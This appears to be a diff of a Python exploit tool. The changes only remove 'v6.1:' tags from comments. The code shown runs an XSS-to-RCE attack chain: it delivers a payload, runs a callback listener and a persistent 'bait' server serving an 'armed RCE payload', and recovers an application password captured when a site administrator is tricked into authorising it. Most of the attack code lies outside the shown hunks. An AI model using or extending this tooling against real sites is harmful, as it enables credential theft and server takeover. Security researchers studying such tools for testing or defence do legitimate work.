@@ -106,7 +106,7 @@ EXIT_CLEAN = 0
 EXIT_ERROR = 1
 EXIT_VULN = 2
 
-# v6.1: persistent x2s-bait service capture log (used when the local
+# persistent x2s-bait service capture log (used when the local
 # listener port is busy and the systemd service does the capturing).
 JSONL_CAPTURE_LOG_CANDIDATES = (
     Path('/root/x2s_captures.jsonl'),
@@ -858,7 +858,7 @@ class Exploit:
         })
 
         if self.proof_mode and not callback_host:
-            # v6.1: --xss/--proof is fully offline — no IP detection.
+            # --xss/--proof is fully offline — no IP detection.
             self.callback_host = '127.0.0.1'
         elif callback_host:
             self.callback_host = callback_host
@@ -907,7 +907,7 @@ class Exploit:
         self._run_started_str = time.strftime('%Y-%m-%d %H:%M:%S')
 
         if self.proof_mode:
-            # v6.1: --xss/--proof is fully offline: no listener, no
+            # --xss/--proof is fully offline: no listener, no
             # callback URL, no selftest, no wait, no VM-bait push.
             self.callback_url = '(proof mode: no callback)'
             log("Proof Mode — Offline: No Listener / Callback / IP "
@@ -936,7 +936,7 @@ class Exploit:
         r = self._deliver_payload(payload)
 
         # Persist payload + target for the persistent bait server.
-        # v6.1: proof mode must NOT overwrite the armed RCE payload —
+        # proof mode must NOT overwrite the armed RCE payload —
         # the VM bait server reads these files on every /bait request.
         if not self.proof_mode:
             try:
@@ -1029,14 +1029,14 @@ class Exploit:
                     time.sleep(2)  # grace window for follow-up beacons
                     break
                 if self.rce_mode and self._read_jsonl_capture():
-                    break  # v6.1: persistent x2s-bait service captured it
+                    break  # persistent x2s-bait service captured it
                 time.sleep(1)
 
         # ── pwn.ai RCE flow: consume captured application password ──
         if self.rce_mode:
             cap = ExploitServer.app_password_capture
             if not cap:
-                # v6.1: local listener port may be busy (persistent
+                # local listener port may be busy (persistent
                 # x2s-bait systemd service) — recover the app password
                 # from its JSONL capture log instead.
                 cap = self._read_jsonl_capture()
@@ -1060,7 +1060,7 @@ class Exploit:
                 log("\nNo application-password Capture — Admin Did Not "
                     "Complete authorize-application During Window", 'warn')
 
-        # v6.1: proof mode never had a listener — skip beacon
+        # proof mode never had a listener — skip beacon
         # processing (stale beacons would pollute the proof report).
         got_rce = (not self.proof_mode) and \
             self._process_results(list(ExploitServer.callback_data))
@@ -1220,7 +1220,7 @@ class Exploit:
             log(f"Could not write proof artifacts: {e}", 'warn')
 
     def _read_jsonl_capture(self):
-        """v6.1: newest APP_PASSWORD_CAPTURED entry from the persistent
+        """newest APP_PASSWORD_CAPTURED entry from the persistent
         x2s-bait service log, only if recorded during this run."""
         for log_path in JSONL_CAPTURE_LOG_CANDIDATES:
             if not log_path.exists():
@@ -1788,7 +1788,7 @@ Exit Codes: 0 Clean | 1 Error | 2 Vulnerable/RCE Confirmed
 
     args = parser.parse_args()
 
-    # v6.1: mode flags imply --exploit so --xss / --rce work standalone
+    # mode flags imply --exploit so --xss / --rce work standalone
     # (parametric parity with Click2Shell-PoC.py).
     if args.proof or args.rce:
         args.exploit = True
